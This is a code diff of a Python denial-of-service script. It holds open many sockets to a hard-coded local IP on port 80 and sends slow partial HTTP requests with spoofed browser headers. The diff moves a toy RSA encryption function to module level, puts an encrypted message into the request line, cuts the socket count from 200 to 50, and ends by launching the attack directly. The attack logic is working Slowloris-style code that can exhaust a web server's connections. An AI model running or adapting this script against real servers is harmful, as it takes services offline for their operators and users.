@@ -5,17 +5,7 @@ import time
 import sys
 import math
 
-class DOSServer():
-    def __init__(self, ip="192.168.31.237", port=80, socketsCount = 200):
-        self.ip = ip
-        self.port = port
-        self.header = [ # might be able to change this more
-            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
-            "Accept-Language: en-us,en;q=0.5"
-        ] 
-        self.socket = [self.refreshSocket() for _ in range(socketsCount)]
-
-    def rsaEncryption(self, message):
+def rsaEncryption(message):
         #generate two prime numbers 
         p = -1
         q = -1
@@ -58,10 +48,22 @@ class DOSServer():
         print("input vaule: " + str(inputValue))
         print("encrypted: " + str(encryptedMessage))
         print("decryptedMessage : " + str(decryptedMessage))
-        return bytes(str(encryptedMessage), 'utf-8')
+        return str(encryptedMessage)
+
+class DOSServer():
+    def __init__(self, message='hi', ip="192.168.31.237", port=80, socketsCount=200):
+        self.ip = ip
+        self.port = port
+        self.message = rsaEncryption(message)
+        self.header = [ # might be able to change this more
+            "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.5) Gecko/20091102 Firefox/3.5.5 (.NET CLR 3.5.30729)",
+            "Accept-Language: en-us,en;q=0.5"
+        ]
+        self.socket = [self.refreshSocket() for _ in range(socketsCount)]
 
     def getMessage(self, message):
-        return (message + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")
+        messages = self.message
+        return (messages + "{} HTTP/1.1\r\n".format(str(random.randint(0, 2000)))).encode("utf-8")
 
     def refreshSocket(self):
         try:
@@ -94,5 +96,5 @@ class DOSServer():
                 time.sleep(sleep/len(self.socket))
 
 
-DOSServer = DOSServer()
+DOSServer = DOSServer(socketsCount=50)
 DOSServer.attack()
